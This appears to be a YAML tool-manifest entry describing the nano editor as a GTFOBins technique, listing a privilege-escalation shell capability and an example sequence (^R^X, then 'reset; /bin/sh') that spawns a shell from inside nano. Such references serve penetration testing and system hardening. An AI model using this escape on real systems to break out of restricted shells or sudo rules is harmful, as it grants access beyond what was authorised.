---
id: text-editor-nano
namespace: text:editor:nano
name: nano
description: Simple text editor, can spawn a shell via ^R^X or execute commands.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
  - system.file.read
platforms:
  - linux
  - bsd
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - vi
  - vim
artifacts: []
workflow_edges:
  produces:
    - shell-access
    - file-content
  consumes:
    - execution-context
    - file
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell or file output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 4
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 4
  network: none
  disk_io: low
allowed-tools:
  - nano
  - Bash
  - execFile
parameters: []
features:
  - interactive
  - process-manip
execution:
  template: "nano /path/to/file"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via nano
    command: |
      nano
      ^R^X
      reset; /bin/sh 1>&0 2>&0
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/nano/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "nano"
    commands:
      - "apt-get install -y nano"
---
